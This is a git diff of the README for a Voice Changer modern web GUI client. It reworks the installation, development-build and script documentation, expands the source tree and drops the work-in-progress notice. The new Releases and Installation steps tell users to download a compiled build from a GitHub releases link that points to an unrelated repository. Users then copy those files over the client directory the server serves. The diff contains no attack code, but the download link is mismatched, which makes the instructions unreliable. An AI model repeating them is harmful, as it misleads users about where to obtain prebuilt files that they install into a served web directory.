@@ -1,12 +1,10 @@
 # Voice Changer - Modern GUI Client
 
-> [!WARNING]
-> **Work In Progress**: This project is currently under active development and is not yet ready for production use. Features may be incomplete, unstable, or subject to significant changes.
-
 ## Table of Contents
 
 - [Overview](#overview)
 - [Features](#features)
+- [Releases](#releases)
 - [Installation](#installation)
 - [Development](#development)
   - [Prerequisites](#prerequisites)
@@ -16,8 +14,6 @@
 - [Project structure](#project-structure)
 - [Technologies used](#technologies-used)
 - [Known issues](#known-issues)
-- [Releases](#releases)
-- [Contribution](#contribution)
 
 ## Overview
 
@@ -37,16 +33,17 @@ This is a modern, redesigned web client for the Voice Changer application that r
 - **Modal System**: Organized modal dialogs for settings and advanced features
 - **Accessibility**: Improved keyboard navigation and screen reader support
 
+## Releases
+
+Download the latest compiled release from the [GitHub Releases page](https://github.com/anthropics/claude-code/releases) to get pre-built files ready for installation.
+
 ## Installation
 
 To use the modern GUI client as a replacement for the original interface:
 
-1. **Build the modern GUI client:**
-   ```bash
-   cd client/modern-gui
-   npm install
-   npm run build
-   ```
+1. **Download the latest release:**
+   
+   Download the compiled release from the [GitHub Releases page](https://github.com/anthropics/claude-code/releases) and extract the files.
 
 2. **Replace the original client files:**
    
@@ -55,8 +52,8 @@ To use the modern GUI client as a replacement for the original interface:
    # Backup original client (optional)
    mv client/demo/dist client/demo/dist_backup
    
-   # Copy modern GUI build to replace original client
-   cp -r client/modern-gui/dist client/demo/dist
+   # Copy modern GUI files to replace original client
+   cp -r path/to/extracted/dist client/demo/dist
    ```
 
 3. **Start the Voice Changer server as usual:**
@@ -90,32 +87,48 @@ To use the modern GUI client as a replacement for the original interface:
    npm install
    ```
 
-3. Start the development server:
-   ```bash
-   npm run start
+3. Configure the Voice Changer server to serve the modern GUI:
+   
+   In your Voice Changer server's `const.py` file, update the `FRONTEND_DIR` path to point to the modern-gui dist directory:
+   ```python
+   FRONTEND_DIR = "client/modern-gui/dist"
    ```
 
-4. Open your browser and navigate to `http://localhost:3000`
+4. Build the development version:
+   ```bash
+   npm run build:dev
+   ```
 
-The development server will start with hot module replacement enabled, allowing you to see changes in real-time.
+5. Start the Voice Changer server as usual
+
+The modern GUI will now be served through the Voice Changer's web server. Rebuild with `npm run build:dev` whenever you make changes to see them reflected.
 
 > [!IMPORTANT]
-> Make sure the Voice Changer backend server is running on `http://localhost:18888` before starting the development client.
+> The Voice Changer backend server must be running and configured to serve from the modern-gui dist directory.
 
 ### Available scripts
 
+**Development:**
 - `npm run start` - Starts the Webpack development server with hot reloading
-- `npm run build` - Creates an optimized production build using Webpack
-- `npm run build:dev` - Creates a development build for testing
-- `npm test` - Runs the test suite with Jest
-- `npm run build:mod` - Builds and copies client library modifications
+
+**Build Scripts:**
+- `npm run clean` - Removes the dist directory
+- `npm run webpack:prod` - **Webpack only** - Runs Webpack with production configuration (no cleanup)
+- `npm run webpack:dev` - **Webpack only** - Runs Webpack with development configuration (no cleanup)
+- `npm run build:prod` - **Complete production build** - Cleans dist directory + runs webpack:prod
+- `npm run build:dev` - **Complete development build** - Cleans dist directory + runs webpack:dev
+
+**Library Modifications:**
+- `npm run build:mod` - Builds and copies middleware library modifications (lib directory)
+- `npm run build:mod_dos` - Windows version of build:mod
+- `npm run build:mod_copy` - Copies library modifications to node_modules (Windows only)
 
 ### Building for production
 
 To create a production build:
 
 ```bash
-npm run build
+npm run build:prod
 ```
 
 This will create a `dist` folder with optimized static files ready for deployment.
@@ -124,19 +137,33 @@ This will create a `dist` folder with optimized static files ready for deploymen
 
 ```
 src/
-├── components/          # Reusable UI components
-│   ├── AudioSettings/   # Audio device and configuration components
-│   ├── Helpers/         # Utility components (sliders, tooltips, etc.)
-│   ├── LeftSideBar/     # Sidebar navigation and model slots
-│   ├── modals/          # Modal dialogs and overlays
-│   └── ...
-├── context/             # React context providers
-│   ├── AppContext.tsx   # Main application state
-│   ├── ThemeContext.tsx # Theme management
-│   └── UIContext.tsx    # UI state and device management
-├── scripts/             # Custom hooks and utilities
-├── styles/              # Global styles and theme constants
-└── App.tsx              # Main application component
+├── components/                    # Reusable UI components
+│   ├── AiSettings/               # AI and voice conversion settings
+│   ├── AudioSettings/            # Audio device and configuration components
+│   ├── BottomBar/                # Bottom navigation and control bar
+│   │   └── Modals/               # Bottom bar modal dialogs
+│   │       └── Merge/            # Model merging functionality
+│   ├── Helpers/                  # Utility components (sliders, drag handlers, etc.)
+│   ├── LeftSideBar/              # Sidebar navigation and model management
+│   │   └── Modals/               # Sidebar modal dialogs
+│   ├── MainContent.tsx           # Central content area
+│   ├── Modals/                   # Global modal dialogs and overlays
+│   ├── ModelSettings/            # Model configuration and settings
+│   └── PerformanceStats/         # Performance monitoring and statistics
+├── context/                      # React context providers
+│   ├── AppContext.tsx            # Main application state
+│   ├── AppRootProvider.tsx       # Root context provider
+│   ├── ThemeContext.tsx          # Theme management
+│   └── UIContext.tsx             # UI state and device management
+├── scripts/                      # Custom hooks and utilities
+│   ├── useAppGuiSetting.ts       # GUI settings management hook
+│   ├── useAudioConfig.ts         # Audio configuration hook
+│   ├── usePlaceholder.ts         # Placeholder utilities
+│   └── useVCClient.ts            # Voice changer client integration
+├── styles/                       # Global styles and theme constants
+│   └── constants.ts              # Style constants and theme definitions
+├── App.tsx                       # Main application component
+└── AppWrapper.tsx                # Application wrapper with providers
 ```
 
 ## Technologies used
@@ -156,21 +183,6 @@ src/
 
 > [!TIP]
 > For backend-related issues or Voice Changer functionality problems, refer to the main project documentation.
-
-## Releases
-
-No releases are available yet. This project is still in development.
-
-## Contribution
-
-This modern GUI client is part of the larger Voice Changer project. For contribution guidelines and development practices, please refer to the main project documentation.
-
-When reporting issues specific to the modern GUI:
-
-1. Specify which browser and version you're using
-2. Include steps to reproduce the issue
-3. Mention if the issue occurs with the original client as well
-4. Provide console error messages if available
 
 ---
 
